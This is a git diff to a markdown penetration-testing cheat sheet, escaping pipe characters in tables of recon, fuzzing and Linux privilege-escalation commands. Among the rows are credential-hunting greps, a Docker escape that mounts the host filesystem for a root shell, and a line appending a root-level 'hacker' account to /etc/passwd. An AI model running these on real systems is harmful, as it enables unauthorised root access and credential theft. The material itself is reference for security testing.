@@ -670,20 +670,20 @@ X-Forwarded-Host: IP
 | Query GitHub for sensitive data using GitMiner | `` gitminer -q '$TARGET' --github-token <access_token> -o gitminer.txt `` |
 | Search for subdomains on Certificate Transparency Logs using CT-Exposer | `` ct-exposer -d $TARGET -o subdomains.txt `` |
 | Perform a SSL certificate transparency log search using certspotter | `` certspotter -d $TARGET -o subdomains.txt `` |
-| Extract SSL certificate information using openssl | `` echo | openssl s_client -showcerts -servername $TARGET -connect $TARGET:443 2>/dev/null | openssl x509 -inform pem -noout -text `` |
+| Extract SSL certificate information using openssl | `` echo \| openssl s_client -showcerts -servername $TARGET -connect $TARGET:443 2>/dev/null \| openssl x509 -inform pem -noout -text `` |
 | Search for API keys and secrets with TruffleHog | `` trufflehog git https://github.com/$TARGET/$REPO --regex --entropy=False `` |
-| Search for GitHub repositories | `` curl -s "https://api.github.com/search/repositories?q=$TARGET" | jq '.items[].full_name' `` |
+| Search for GitHub repositories | `` curl -s "https://api.github.com/search/repositories?q=$TARGET" \| jq '.items[].full_name' `` |
 | Search for exposed S3 buckets | `` curl -s "http://$TARGET.s3.amazonaws.com/" `` |
 | Enumerate social media accounts with Sherlock | `` sherlock $TARGET `` |
 | Extract metadata from documents | `` exiftool document.pdf `` |
 | Search for pastebin entries | `` curl -s "https://psbdmp.ws/api/search/$TARGET" `` |
 | Shodan search for target | `` shodan search hostname:$TARGET `` |
 | Censys search for certificates | `` censys search "parsed.names: $TARGET" `` |
-| Search for security headers | `` curl -I https://$TARGET | grep -i security `` |
-| Check for robots.txt disallowed paths | `` curl -s https://$TARGET/robots.txt | grep Disallow `` |
-| Extract emails from Google search results | `` inurl:$TARGET filetype:pdf | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' `` |
+| Search for security headers | `` curl -I https://$TARGET \| grep -i security `` |
+| Check for robots.txt disallowed paths | `` curl -s https://$TARGET/robots.txt \| grep Disallow `` |
+| Extract emails from Google search results | `` inurl:$TARGET filetype:pdf \| grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' `` |
 | Search for leaked credentials with dehashed | `` dehashed -q $TARGET -p `` |
-| WHOIS information with additional details | `` whois $TARGET | grep -E "(Name Server|Creation Date|Expiry|Registrar)" `` |
+| WHOIS information with additional details | `` whois $TARGET \| grep -E "(Name Server|Creation Date|Expiry|Registrar)" `` |
 
 ### Active Infrastructure Identification
 | Description        | Command      |
@@ -770,7 +770,7 @@ X-Forwarded-Host: IP
 | Response size filtering | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -fs 1234,5678 `` |
 | Response word count filtering | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -fw 100 `` |
 | HTTP status code filtering | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -fc 404,403 `` |
-| Regex response filtering | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -fr "error|not found" `` |
+| Regex response filtering | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -fr "error\\|not found" `` |
 | Output results to file | `` ffuf -w wordlist.txt:FUZZ -u http://example.com/FUZZ -o results.json -of json `` |
 
 ### Wordlists
@@ -845,17 +845,17 @@ X-Forwarded-Host: IP
 | Find world-writable files | `` find / -perm -2 -type f 2>/dev/null `` |
 | Find files with no owner | `` find / -nouser 2>/dev/null `` |
 | Find files with no group | `` find / -nogroup 2>/dev/null `` |
-| Check for sudo version vulnerabilities | `` sudo --version && searchsploit sudo $(sudo --version | head -1 | awk '{print $3}') `` |
+| Check for sudo version vulnerabilities | `` sudo --version && searchsploit sudo $(sudo --version \| head -1 \| awk '{print $3}') `` |
 | Enumerate cron jobs | `` cat /etc/crontab && ls -la /etc/cron* && crontab -l `` |
-| Check kernel version for exploits | `` uname -a && cat /proc/version && searchsploit kernel $(uname -r | cut -d'-' -f1) `` |
+| Check kernel version for exploits | `` uname -a && cat /proc/version && searchsploit kernel $(uname -r \| cut -d'-' -f1) `` |
 | Find interesting files in home directories | `` find /home -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.config" -o -name "*.conf" -o -name "history*" \) 2>/dev/null `` |
-| Check for Docker privilege escalation | `` groups | grep docker && docker images && docker run -v /:/mnt --rm -it alpine chroot /mnt sh `` |
+| Check for Docker privilege escalation | `` groups \| grep docker && docker images && docker run -v /:/mnt --rm -it alpine chroot /mnt sh `` |
 | Enumerate network connections and services | `` netstat -tulpn && ss -tulpn `` |
-| Check environment variables for secrets | `` env | grep -i pass `` |
-| Search for passwords in files | `` grep -r -i password /etc/ 2>/dev/null | head -20 `` |
-| Check process list for interesting processes | `` ps aux | grep root `` |
+| Check environment variables for secrets | `` env \| grep -i pass `` |
+| Search for passwords in files | `` grep -r -i password /etc/ 2>/dev/null \| head -20 `` |
+| Check process list for interesting processes | `` ps aux \| grep root `` |
 | Linux capabilities enumeration | `` getcap -r / 2>/dev/null `` |
-| Check for NFS shares with no_root_squash | `` cat /etc/exports | grep no_root_squash `` |
+| Check for NFS shares with no_root_squash | `` cat /etc/exports \| grep no_root_squash `` |
 | Writable /etc/passwd for privilege escalation | `` echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd `` |
 
 ### Transferring Files
